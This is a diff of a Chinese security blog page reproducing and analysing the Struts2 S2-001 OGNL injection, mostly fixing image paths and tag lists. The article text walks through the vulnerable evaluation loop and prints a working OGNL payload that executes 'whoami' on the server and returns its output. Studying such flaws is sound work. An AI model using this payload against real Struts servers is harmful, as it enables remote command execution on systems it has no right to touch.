@@ -281,29 +281,29 @@ var _hmt = _hmt || [];
 <h1 id="s2-001漏洞复现"><a href="#s2-001漏洞复现" class="headerlink" title="s2-001漏洞复现"></a>s2-001漏洞复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><img src="I:\复现截图\2021-09-10-154742.png"></p>
 <h2 id="漏洞复现及分析"><a href="#漏洞复现及分析" class="headerlink" title="漏洞复现及分析"></a>漏洞复现及分析</h2><h3 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h3><p>OGNL表达式</p>
 <h3 id="大致流程如下："><a href="#大致流程如下：" class="headerlink" title="大致流程如下："></a>大致流程如下：</h3><p>从<strong>index.jsp</strong>的<code>&lt;s:textfiled&gt;</code>进入<strong>struts2-core-2.0.1.jar</strong>的<strong>ComponentTagSupport.class</strong>的<code>doEndTag</code>函数中</p>
-<p><img src="2021-09-10-144408.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-144408.png"></p>
 <p>再进入<strong>UIBean.class</strong>的<code>end</code>函数中</p>
-<p><img src="2021-09-10-144625.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-144625.png"></p>
 <p>再进入<code>evaluateParams</code>函数中，在276行，进入<code>findvalue</code>函数</p>
-<p><img src="2021-09-10-144902.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-144902.png"></p>
 <p>进入<strong>TextParseUtil.class</strong>的<code>translateVariables</code>函数</p>
-<p><img src="2021-09-10-145023.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-145023.png"></p>
 <p>最后，在<code>translateVariables</code>中的55行执行了命令</p>
-<p><img src="2021-09-10-145556.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-145556.png"></p>
 <h3 id="poc解释："><a href="#poc解释：" class="headerlink" title="poc解释："></a>poc解释：</h3><p>网上的漏洞分析其实已经很多了，主要是一些关键的判断点，正常时和执行命令时会有哪些不同</p>
 <p>在进入evaluateParams函数时，由于会给其this.name进行赋值</p>
-<p><img src="2021-09-10-150839.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-150839.png"></p>
 <p>导致后面由于value为空，对username添加了<code>%&#123;&#125;</code>成为了表达式的格式。</p>
-<p><img src="2021-09-10-151200.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-151200.png"></p>
 <p>对其进行评估过后，会将传入的username参数的值赋给对象o（这里我们可以看到，如果表达式不是以%{开头，也就是传入的值正常时，会进入return。）</p>
-<p><img src="2021-09-10-152005.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-152005.png"></p>
 <p>此时expression为%{4+5}，且并没有进行return，也就是说会继续上面的步骤进行循环，直到expression不为表达式为止。</p>
-<p><img src="2021-09-10-152412.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-152412.png"></p>
 <p>但此时，请看，由于expression依然是表达式的形式，于是它将<code>%&#123;4+5&#125;</code>当成表达式进行了执行</p>
-<p><img src="2021-09-10-153108.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-153108.png"></p>
 <p>于是就有了s2-001这个漏洞。而且由于while始终为True，所以在外面套多少层%{}都能执行。</p>
 <p>下面贴一个没加<code>%&#123;&#125;</code>的，蓝色为运行位置，和上面的区别一看就知道：</p>
-<p><img src="2021-09-10-153708.png"></p>
+<p><img src="/2021/09/10/struts2-s2-001%E5%A4%8D%E7%8E%B0/2021-09-10-153708.png"></p>
 <h3 id="命令执行解释："><a href="#命令执行解释：" class="headerlink" title="命令执行解释："></a>命令执行解释：</h3><p>如果要命令执行，就涉及到OGNL的一些概念了，由于我学的也不是很深，写的可能不是很好，所以希望大佬轻喷。</p>
 <p>比如下面的命令执行（在逗号处用了回车，这样分析起来更好看一些，用的时候最好别这么写）</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -525,7 +525,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -648,11 +648,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -668,23 +676,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -708,6 +712,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -728,11 +740,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -748,15 +768,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -764,7 +776,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -772,11 +784,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
